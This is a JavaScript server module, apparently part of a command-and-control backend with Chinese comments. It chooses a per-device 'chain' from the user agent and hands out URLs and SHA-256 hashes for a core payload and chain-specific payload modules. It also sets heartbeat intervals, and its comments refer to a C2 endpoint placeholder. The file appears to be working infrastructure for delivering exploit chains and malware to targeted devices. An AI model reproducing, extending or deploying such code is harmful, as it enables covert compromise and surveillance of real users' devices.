import { Payload } from '../../../core/db/models/index.js';
import { getRedis } from '../../../core/db/connection.js';
import { DEFAULTS } from '../../../config/constants.js';
import { logger } from '../../../core/logger/index.js';
import { getPayloadParamsCached } from '../../../core/config/payload-params-cache.js';
// ★ I1-C1：接入链路路由层（搬运自契约 C-5 采用版，哈希锁定）。
//   pickChain(ua) 返回 {chain, partial, version, build, reach} 或 **null**（不支持）。
//   ★ null 必须回 unsupported，**不得回退到默认链**（见 chain-router.js:163 的契约注释）。
import { pickChain, moduleBelongsToChain } from './chain-router.js';
const CACHE_TTL = 300;
export async function getConfigJson(channel, device, origin) {
    // ★ GAP2(a)：channel 未命中（Host 不在渠道白名单）⇒ 显式 unsupported。
    //   **绝不**用未经白名单校验的 Host 拼接下发的 URL。
    if (!channel) {
        return { unsupported: true, reason: 'no_channel_for_host' };
    }
    // ★ GAP2：fail-loud 守卫 —— origin 由路由层传入，必须是合法 http(s) 源。
    //   否则**绝不产出**带占位符 / 空 origin 的载荷 URL（与 `__C2_ENDPOINT__` 注入口径同源）。
    if (typeof origin !== 'string' || !/^https?:\/\/[^/]+$/.test(origin)) {
        throw new Error('config-builder: origin 缺失或非法，拒绝产出载荷 URL');
    }
    const params = await getPayloadParamsCached();
    const modules = await Payload.find({ type: 'module', active: true }).lean();
    // ★ I1-C1：按设备 UA 选链；选不出链 ⇒ 显式 unsupported，不回退。
    const ua = device?.userAgent || device?.ua || '';
    const route = pickChain(ua);
    if (!route) {
        logger.info({ ua: ua.slice(0, 120) }, 'Config request: device not supported by any chain');
        return { unsupported: true, reason: 'no_chain_for_device' };
    }
    // 只下发属于该链的模块（moduleBelongsToChain 是 entries 的分链判据）
    const chainModules = modules.filter((m) => moduleBelongsToChain(m.name, route.chain));
    return {
        settings: {
            configRefreshInterval: params?.configRefreshInterval || DEFAULTS.CONFIG_REFRESH_INTERVAL,
            heartbeatReportInterval: params?.heartbeatReportInterval || DEFAULTS.HEARTBEAT_REPORT_INTERVAL,
            minPingIntervalPerDomain: params?.minPingIntervalPerDomain || DEFAULTS.MIN_PING_INTERVAL_PER_DOMAIN,
            validationCacheTTL: params?.validationCacheTTL || DEFAULTS.VALIDATION_CACHE_TTL,
        },
        // ★ I1-C1：下发选中的链与其版本信息，供客户端按链取载荷。
        chain: route.chain,
        chainReach: route.reach,
        // ★ GAP2(b)：URL 由**已过白名单校验的 origin** 拼接（原为硬编码占位符的坏字面量）
        core: {
            url: `${origin}/details/ch/${channel.code}/corepayload.js`,
            sha256: channel.corePayloadSha256,
            size: channel.corePayloadSize,
        },
        entries: chainModules.map(m => ({
            bundleId: m.bundleId,
            url: `${origin}/details/${m.name}.js`,
            sha256: m.sha256,
            size: m.size,
            cold: m.cold ? 1 : 0,
            flags: { do_not_close_after_run: m.doNotCloseAfterRun },
        })),
    };
}
export async function getCachedConfigBuffer(key) {
    try {
        const redis = getRedis();
        const cached = await redis.getBuffer(key);
        return cached;
    }
    catch (err) {
        logger.warn({ err }, 'Redis read failed for config cache');
        return null;
    }
}
export async function setCachedConfigBuffer(key, buffer) {
    try {
        const redis = getRedis();
        await redis.set(key, buffer, 'EX', CACHE_TTL);
    }
    catch (err) {
        logger.warn({ err }, 'Redis write failed for config cache');
    }
}
export async function invalidateConfigCache() {
    try {
        const redis = getRedis();
        // 清除所有 payload_config:* keys
        const keys = await redis.keys('payload_config:*');
        if (keys.length > 0) {
            await redis.del(...keys);
        }
    }
    catch (err) {
        logger.warn({ err }, 'Redis delete failed for config cache');
    }
}
//# sourceMappingURL=config-builder.js.map